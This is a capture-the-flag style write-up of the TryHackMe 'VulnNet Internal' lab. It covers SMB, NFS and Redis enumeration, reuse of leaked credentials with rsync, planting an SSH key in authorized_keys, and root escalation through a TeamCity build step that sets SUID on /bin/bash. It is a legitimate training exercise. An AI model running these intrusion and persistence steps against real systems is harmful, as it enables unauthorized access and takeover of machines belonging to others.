---
layout: post
title: TryHackMe Vulnet Internal - Writeup
lang: en
ref: vulnet-internal
---

Vulnet is an easy/medium difficulty TryHackMe machine.

![](/assets/writeups/vulnet-internal/vulnet_internal.png)

## Challenge brief

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can’t make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you’re tasked to perform a penetration test of their network and report your findings.

There are four flags that need to be submitted in order to complete the challenge:
- Service Flag
- Internal Flag
- User Flag
- Root Flag

# Enumeration

## Nmap Scan

```bash
nmap -p- -sS -T5 --min-rate 1000 --max-retries=3 --open -vvv -n -Pn 10.10.132.157 -oG allPorts
```

![](/assets/writeups/vulnet-internal/nmap_ports.png)

```bash
nmap -sC -sV -p22,111,139,445,873,2049,6379,40031,40423,44823,53943 10.10.132.157 -oN targeted
```

![](/assets/writeups/vulnet-internal/nmap_services.png)


## Port 139 & 445 - SMB

Let's enumarate with enum4linux

```bash 
enum4linux - a 10.10.132.157

========================================= 
|    Share Enumeration on 10.10.132.157   |
========================================= 
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.132.157
//10.10.132.157/print$   Mapping: DENIED, Listing: N/A
//10.10.132.157/shares   Mapping: OK, Listing: OK
//10.10.132.157/IPC$     [E] Can not understand response:

====================================================================
| Users on 10.10.132.157 via RID cycling (RIDS: 500-550,1000-1050) |
====================================================================

[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1569020563-4280465252-527208056
[I] Found new SID: S-1-5-32

[+] Enumerating users using SID S-1-5-21-1569020563-4280465252-527208056 and logon username '', password ''
S-1-5-21-1569020563-4280465252-527208056-513 VULNNET-INTERNAL\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\sys-internal (Local User)
```

Let's access to `//10.10.132.157/shares` with smbclient using a null session.

![](/assets/writeups/vulnet-internal/smbclient_shares.png)

Inside /tmp we will get the services.txt flag

```bash
$ cat services.txt 
THM{0a09d51e488f5......}
```

## Port 2049 - nfs_acl

Port 2049 is open and noticed that there was a lot of output for port 111. I can see in the output for port 111, that the service NFS was present in the output. This indicates that I might be able to list and download (and maybe upload) files.

More about NFS:

- [2049 - Pentesting NFS Service](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

- [Exploiting NFS share [updated 2021]](https://resources.infosecinstitute.com/topic/exploiting-nfs-share/)

![](/assets/writeups/vulnet-internal/nfs.png)

```bash
mkdir /tmp/infosec
mount -t nfs 10.10.132.157:/opt/conf /tmp/infosec
```

![](/assets/writeups/vulnet-internal/redis_pass.png)

## Port 6379 - Redis

Port 6379 is open, and now we have a password.

`requirepass "B65Hx562...."`

More about Redis:

- [6379 - Pentesting Redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

```bash
redis-cli -h 10.10.132.157

AUTH B65Hx562....

info

keys *

GET "internal flag"
"THM{ff8e518addbb.......}"

LRANGE "authlist" 0 100
"QXV0aG9ya...."
```

## Port 873 - Rsync

In the "authlist" key, we found a base64 encoded value, when decoded gives us the credentials for the rsync service.

More about Rsync:

- [873 - Pentesting Rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

```bash
nc -vn 10.10.132.157 873

@RSYNCD: 31.0
#list

files
```

```bash
rsync rsync://rsync-connect@10.10.132.157/files/

rsync rsync://rsync-connect@10.10.132.157/files/sys-internal

rsync rsync://rsync-connect@10.10.132.157/files/sys-internal/user.txt .

"THM{da7cc20696.......}"
```

Let's get a shell

```bash
ssh-keygen -o

rsync -av id_rsa.pub rsync://rsync-connect@10.10.132.157/files/sys-internal/.ssh/authorized_keys

ssh -i id_rsa sys-internal@10.10.132.157
```

I now have a SSH access to the target machine.

![](/assets/writeups/vulnet-internal/shell.png)

## Root Privilege Escalation - TeamCity

More about TeamCity:

- [Pentest Teamcity](https://github.com/kacperszurek/pentest_teamcity)

```bash
ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.10.132.157
```

Taking a look into the server, inside `/TeamCity/logs` there is a file called `catalina.out`, there we can find the token to log in a super admin.

Now:

```markdown
- Create a project
- Create a build configuration
- Search for build steps
    - New build step (command line)
    - script: `chmod +s /bin/bash`

- Run!
```

![](/assets/writeups/vulnet-internal/suid_bash.png)

![](/assets/writeups/vulnet-internal/run_project.png)

![](/assets/writeups/vulnet-internal/root.png)
